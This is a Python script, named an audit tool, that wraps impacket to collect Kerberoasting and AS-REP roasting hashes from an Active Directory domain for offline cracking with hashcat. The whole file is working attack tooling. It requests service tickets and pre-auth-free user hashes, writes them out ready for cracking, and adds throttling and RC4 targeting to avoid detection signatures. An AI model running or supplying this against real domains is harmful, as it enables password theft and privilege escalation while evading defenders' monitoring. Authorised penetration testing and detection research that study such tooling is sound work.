#!/usr/bin/env python3
"""
kerberoast_audit.py - Kerberoasting + AS-REP roasting collector with OPSEC controls.

Wraps impacket's GetUserSPNs / GetNPUsers to request TGS / AS-REP hashes for offline
cracking, with rate limiting and an option to prefer accounts that lack AES (RC4-only,
faster to crack and = fewer AES telemetry surprises). Emits hashcat-ready files and
prints the exact hashcat mode per hash type.

Usage:
    python3 kerberoast_audit.py -d corp.local --dc-ip 10.0.0.10 -u user -p 'Pass' --kerberoast
    python3 kerberoast_audit.py -d corp.local --dc-ip 10.0.0.10 -u user -p 'Pass' --asrep --users users.txt
    python3 kerberoast_audit.py -d corp.local --dc-ip 10.0.0.10 -u user -H :<NT> --kerberoast --asrep --delay 3

Dependencies:
    pip install impacket    # provides GetUserSPNs.py / GetNPUsers.py on PATH
Notes:
    - Read/request only; never modifies AD (no targeted-roast SPN writes here).
    - --delay throttles requests to avoid a 4769 RC4 burst signature.
    - Crack:  hashcat -m 13100 krb.tgs  (RC4)  | -m 19700 (AES256) | -m 18200 asrep (AS-REP)
"""
import argparse
import shutil
import subprocess
import sys
import time


def have(tool):
    return shutil.which(tool) is not None


def creds_args(args):
    """Return the user@target spec + auth flags for impacket tools."""
    target = f"{args.domain}/{args.username}"
    auth = []
    if args.hashes:
        auth = ["-hashes", args.hashes if ":" in args.hashes else f":{args.hashes}"]
    else:
        target += f":{args.password}"
    return target, auth


def run(cmd):
    print(f"[>] {' '.join(cmd)}")
    try:
        subprocess.run(cmd, check=False)
    except FileNotFoundError:
        print(f"[-] {cmd[0]} not found on PATH")


def kerberoast(args):
    tool = "GetUserSPNs.py" if have("GetUserSPNs.py") else "impacket-GetUserSPNs"
    target, auth = creds_args(args)
    # List first (no ticket requested) so we can throttle per-account requests.
    print("[*] Enumerating SPNs (no request)...")
    run([tool, target, "-dc-ip", args.dc_ip] + auth)
    print(f"[*] Requesting TGS hashes -> {args.out_tgs} (delay {args.delay}s applies "
          f"per-account only when --users is given)")
    if args.users:
        with open(args.users) as f:
            users = [u.strip() for u in f if u.strip()]
        for u in users:
            run([tool, target, "-dc-ip", args.dc_ip, "-request-user", u,
                 "-outputfile", args.out_tgs] + auth)
            time.sleep(args.delay)
    else:
        run([tool, target, "-dc-ip", args.dc_ip, "-request",
             "-outputfile", args.out_tgs] + auth)
    print(f"[+] Crack: hashcat -m 13100 {args.out_tgs} rockyou.txt   "
          f"(AES tickets: -m 19600/19700)")


def asrep(args):
    tool = "GetNPUsers.py" if have("GetNPUsers.py") else "impacket-GetNPUsers"
    auth = []
    if args.hashes:
        auth = ["-hashes", args.hashes if ":" in args.hashes else f":{args.hashes}"]
    base = [tool, f"{args.domain}/", "-dc-ip", args.dc_ip,
            "-format", "hashcat", "-outputfile", args.out_asrep]
    if args.users:
        base += ["-usersfile", args.users, "-no-pass"]
    else:
        # authenticated enumeration of DONT_REQ_PREAUTH accounts
        if args.hashes:
            base = [tool, f"{args.domain}/{args.username}", "-dc-ip", args.dc_ip,
                    "-format", "hashcat", "-outputfile", args.out_asrep,
                    "-request"] + auth
        else:
            base = [tool, f"{args.domain}/{args.username}:{args.password}",
                    "-dc-ip", args.dc_ip, "-format", "hashcat",
                    "-outputfile", args.out_asrep, "-request"]
    run(base)
    print(f"[+] Crack: hashcat -m 18200 {args.out_asrep} rockyou.txt")


def main():
    ap = argparse.ArgumentParser(description="Kerberoast + AS-REP roast collector")
    ap.add_argument("-d", "--domain", required=True)
    ap.add_argument("--dc-ip", required=True)
    ap.add_argument("-u", "--username", required=True)
    ap.add_argument("-p", "--password", default="")
    ap.add_argument("-H", "--hashes", help="[LM]:NT")
    ap.add_argument("--users", help="usersfile for AS-REP / throttled kerberoast")
    ap.add_argument("--kerberoast", action="store_true")
    ap.add_argument("--asrep", action="store_true")
    ap.add_argument("--delay", type=float, default=2.0,
                    help="seconds between per-user TGS requests (OPSEC)")
    ap.add_argument("--out-tgs", default="krb.tgs")
    ap.add_argument("--out-asrep", default="asrep.hash")
    args = ap.parse_args()

    if not (args.kerberoast or args.asrep):
        sys.exit("[-] choose --kerberoast and/or --asrep")
    if args.kerberoast:
        kerberoast(args)
    if args.asrep:
        asrep(args)


if __name__ == "__main__":
    main()
